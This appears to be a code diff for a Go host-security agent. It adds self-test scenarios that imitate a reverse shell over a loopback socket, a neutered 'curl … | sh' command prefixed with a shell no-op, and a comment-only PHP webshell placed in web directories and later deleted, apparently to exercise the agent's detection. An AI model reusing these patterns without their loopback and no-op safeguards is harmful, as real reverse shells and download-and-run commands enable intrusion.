@@ -41,6 +41,12 @@ func (a *Agent) runCommand(cmd model.AgentCommand) model.CommandResult {
 		na, err = simProcess(cmd.ID)
 	case simulate.HoneypotAccess:
 		err = simHoneypot(cmd.ID, cmd.Params["target"])
+	case simulate.ReverseShell:
+		na, err = a.simReverseShell(cmd.ID)
+	case simulate.DownloadExec:
+		na, err = a.simDownloadExec(cmd.ID)
+	case simulate.WebshellDrop:
+		na, err = a.simWebshell(cmd.ID)
 	default:
 		res.Status, res.Detail = "error", "unknown scenario "+cmd.Scenario
 		return res
@@ -163,4 +169,104 @@ func copyFile(src, dst string, mode os.FileMode) error {
 		return err
 	}
 	return out.Close()
+}
+
+func (a *Agent) hasCapability(c string) bool {
+	for _, x := range a.info.Capabilities {
+		if x == c {
+			return true
+		}
+	}
+	return false
+}
+
+// startShell 启动 sh 执行 script（结尾的 "; :" 防止 shell 直接被最后一条命令替换，保证进程一直是 shell），
+// 确认存活后返回其 PID，simDuration 后结束。
+func startShell(script string, stdio *os.File) (int, error) {
+	cmd := exec.Command("/bin/sh", "-c", script+"; :")
+	var stderr strings.Builder
+	cmd.Stderr = &stderr
+	if stdio != nil {
+		cmd.Stdin, cmd.Stdout = stdio, stdio
+	}
+	if err := cmd.Start(); err != nil {
+		return 0, err
+	}
+	exited := make(chan error, 1)
+	go func() { exited <- cmd.Wait() }()
+	time.AfterFunc(simDuration, func() { _ = cmd.Process.Kill() })
+	select {
+	case err := <-exited:
+		return 0, fmt.Errorf("测试 shell 启动后立即退出（%v）：%s", err, strings.TrimSpace(stderr.String()))
+	case <-time.After(500 * time.Millisecond):
+		return cmd.Process.Pid, nil
+	}
+}
+
+// simReverseShell 让 shell 的输入输出连接到 Agent 自己在本机建立的 TCP 连接：结构上与反弹 shell 相同，
+// 但对端是 Agent 自己，不会收到任何命令。
+func (a *Agent) simReverseShell(id string) (string, error) {
+	if !a.hasCapability("exec_monitor") {
+		return "命令审计未启用（需要 Linux 且以 root 运行）", nil
+	}
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		return "", err
+	}
+	accepted := make(chan net.Conn, 1)
+	go func() {
+		c, err := ln.Accept()
+		ln.Close()
+		if err == nil {
+			accepted <- c
+		}
+	}()
+	client, err := net.Dial("tcp", ln.Addr().String())
+	if err != nil {
+		ln.Close()
+		return "", err
+	}
+	f, err := client.(*net.TCPConn).File()
+	if err != nil {
+		client.Close()
+		return "", err
+	}
+	// 编号放在空操作 ":" 的参数里（不能用 # 注释：会把 startShell 追加的 "; :" 一起注释掉）
+	_, err = startShell(fmt.Sprintf("sleep %d; : safe-sim %s", int(simDuration.Seconds()), id), f)
+	f.Close() // 子进程已继承
+	time.AfterFunc(simDuration+5*time.Second, func() {
+		client.Close()
+		select {
+		case c := <-accepted:
+			c.Close()
+		default:
+		}
+	})
+	return "", err
+}
+
+// simDownloadExec 执行含"curl … | sh"字样的命令：":" 是 shell 的空操作，实际不下载也不执行。
+func (a *Agent) simDownloadExec(id string) (string, error) {
+	if !a.hasCapability("exec_monitor") {
+		return "命令审计未启用（需要 Linux 且以 root 运行）", nil
+	}
+	_, err := startShell(fmt.Sprintf(": curl http://127.0.0.1:9/safe-sim-%s | sh; sleep %d", id, int(simDuration.Seconds())), nil)
+	return "", err
+}
+
+// simWebshell 在第一个存在的网站目录写入只含注释的 PHP 文件，稍后删除。
+func (a *Agent) simWebshell(id string) (string, error) {
+	for _, dir := range a.cfg.WebDirs {
+		if fi, err := os.Stat(dir); err != nil || !fi.IsDir() {
+			continue
+		}
+		path := filepath.Join(dir, "safe-sim-"+id+".php")
+		content := "<?php /* safe 攻击模拟自检 " + id + "：不包含任何代码，约 2 分钟后自动删除 */ ?>\n"
+		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
+			return "无法写入网站目录 " + dir + "（" + err.Error() + "）", nil
+		}
+		time.AfterFunc(simDuration, func() { os.Remove(path) })
+		return "", nil
+	}
+	return "本机没有网站目录（" + strings.Join(a.cfg.WebDirs, "、") + "）", nil
 }
